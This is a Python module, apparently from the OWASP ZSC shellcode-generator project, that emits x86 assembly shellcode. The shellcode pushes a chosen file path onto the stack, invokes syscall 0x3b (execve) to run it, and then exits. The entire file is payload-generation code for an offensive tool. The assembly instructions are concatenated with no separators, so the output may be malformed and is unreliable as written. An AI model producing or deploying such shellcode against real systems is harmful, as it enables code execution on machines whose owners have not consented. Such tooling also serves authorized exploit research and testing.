
"""
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
"""
from owasp_zsc.new_cores import stack
from owasp_zsc.new_cores import base_module


class Module(base_module.BasePayload):
    file_dest = base_module.OptString("", "Destination file")

    def generate(self):
        payload = stack.generate(self.file_dest, '%ebx', 'string')
        payload += "mov    %%esp, %%ebx"
        payload += "xor    %%eax, %%eax"
        payload += "push   %%eax"
        payload += "mov    %%esp, %%edx"
        payload += "push   %%ebx"
        payload += "mov    %%esp, %%ecx"
        payload += "push   %%edx"
        payload += "push   %%ecx"
        payload += "push   %%ebx"
        payload += "mov    $0x3b, %%al"
        payload += "push   $0x2a"
        payload += "int    $0x80"
        payload += "mov    $0x1, %%al"
        payload += "mov    $0x1, %%bl"
        payload += "int    $0x80"
        return payload
